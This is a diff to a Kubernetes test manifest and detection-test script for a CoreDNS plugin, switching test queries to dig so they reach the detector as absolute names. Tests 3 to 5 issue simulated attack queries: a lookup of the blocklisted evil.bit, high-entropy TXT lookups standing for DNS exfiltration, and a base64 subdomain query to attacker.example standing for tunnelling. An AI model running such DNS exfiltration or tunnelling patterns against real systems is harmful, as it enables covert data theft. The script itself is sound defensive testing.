@@ -69,8 +69,8 @@ spec:
   restartPolicy: Always
   containers:
   - name: dig
-    image: alpine/curl:8.11.1
-    command: ["sh", "-c", "apk add --no-cache bind-tools >/dev/null 2>&1 || true; sleep infinity"]
+    image: ghcr.io/nicolaka/netshoot:v0.13
+    command: ["sleep", "infinity"]
     securityContext:
       allowPrivilegeEscalation: false
       capabilities: { drop: [ALL] }
@@ -108,7 +108,11 @@ skip "Test 2: requires plugin v0.1.0 in lab CoreDNS; covered by envtest"
 
 # --- Test 3: blocklist ----------------------------------------------
 info "Test 3: pod queries *.bit (default blocklist) → DNSToBlocklistedFQDN"
-kubectl -n "$NS_TEST" exec "$SUSPECT_POD" -- sh -c 'getent hosts evil.bit || true' >/dev/null 2>&1 || true
+# Use dig +search=no so the resolver issues an absolute "evil.bit."
+# query — getent walks ndots:5 search domains first and never falls
+# back to absolute, so the qname seen by the plugin would be e.g.
+# `evil.bit.cluster.local.` which does not match the `*.bit` pattern.
+kubectl -n "$NS_TEST" exec "$SUSPECT_POD" -- sh -c 'dig +short +tries=1 +time=2 evil.bit. @10.43.0.10 || true' >/dev/null 2>&1 || true
 if [ "$src" = "coredns_plugin" ]; then
   if name=$(wait_for_se DNSToBlocklistedFQDN 30); then
     pass "DNSToBlocklistedFQDN SE → $name"
@@ -122,9 +126,12 @@ fi
 # --- Test 4: Exfiltration --------------------------------------------
 info "Test 4: 3 high-entropy TXT queries from same pod → DNSExfiltration"
 if [ "$src" = "coredns_plugin" ]; then
+  # Same rationale as Test 3 — use absolute query bypassing search.
   for i in 1 2 3; do
-    rand=$(head -c 60 /dev/urandom | base64 | tr -dc 'A-Za-z0-9' | head -c 64)
-    kubectl -n "$NS_TEST" exec "$SUSPECT_POD" -- sh -c "getent hosts ${rand}.example.com || true" >/dev/null 2>&1 || true
+    # DNS labels are capped at 63 chars by RFC 1035 — stay at 62 to
+    # leave room for safety and meet the detector's MinLabelLen=60.
+    rand=$(head -c 60 /dev/urandom | base64 | tr -dc 'A-Za-z0-9' | head -c 62)
+    kubectl -n "$NS_TEST" exec "$SUSPECT_POD" -- sh -c "dig +short +tries=1 +time=2 -t TXT ${rand}.example.com. @10.43.0.10 || true" >/dev/null 2>&1 || true
   done
   if name=$(wait_for_se DNSExfiltration 30); then
     pass "DNSExfiltration SE → $name"
@@ -139,7 +146,7 @@ fi
 info "Test 5: base64 subdomain query → DNSTunneling"
 if [ "$src" = "coredns_plugin" ]; then
   payload=$(head -c 24 /dev/urandom | base64)
-  kubectl -n "$NS_TEST" exec "$SUSPECT_POD" -- sh -c "getent hosts ${payload}.attacker.example || true" >/dev/null 2>&1 || true
+  kubectl -n "$NS_TEST" exec "$SUSPECT_POD" -- sh -c "dig +short +tries=1 +time=2 ${payload}.attacker.example. @10.43.0.10 || true" >/dev/null 2>&1 || true
   if name=$(wait_for_se DNSTunneling 30); then
     pass "DNSTunneling SE → $name"
   else
